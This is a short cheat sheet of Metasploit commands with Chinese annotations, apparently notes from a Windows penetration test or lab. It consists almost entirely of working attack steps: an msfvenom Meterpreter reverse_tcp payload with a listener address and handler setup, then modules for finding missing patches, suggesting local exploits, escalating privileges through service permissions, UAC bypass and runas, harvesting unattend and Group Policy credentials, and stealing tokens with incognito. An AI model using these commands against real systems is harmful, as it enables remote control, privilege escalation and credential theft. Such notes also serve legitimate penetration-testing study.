```
auxiliary/scanner/portscan/tcp 
端口扫描
```

```
msfvenom -p windows/x64/meterpreter/reverse_tcp  lhost=192.168.42.129  lport=1235 -f exe > 1.exe
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.42.129
set lport 1235
exploit -j

```

```
post/windows/gather/enum_patches
查找缺少的补丁
```

```
post/multi/recon/local_exploit_suggester
找出系统中可能被利用的漏洞
```

```
exploit/windows/local/service_permissions 
服务提权
```

```
未找到可信任服务路径漏洞
```

```
use  post/windows/gather/enum_unattend
寻找自动安装配置文件
```

```
 post/windows/gather/credentials/gpp 
 获取组策略的凭据
```

```
exploit/windows/local/bypassuac
uac提权
use exploit/windows/local/bypassuac_injection
```

```
use exploit/windows/local/ask
runas提权
```

```
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u
令牌窃取
impersonate_token

```

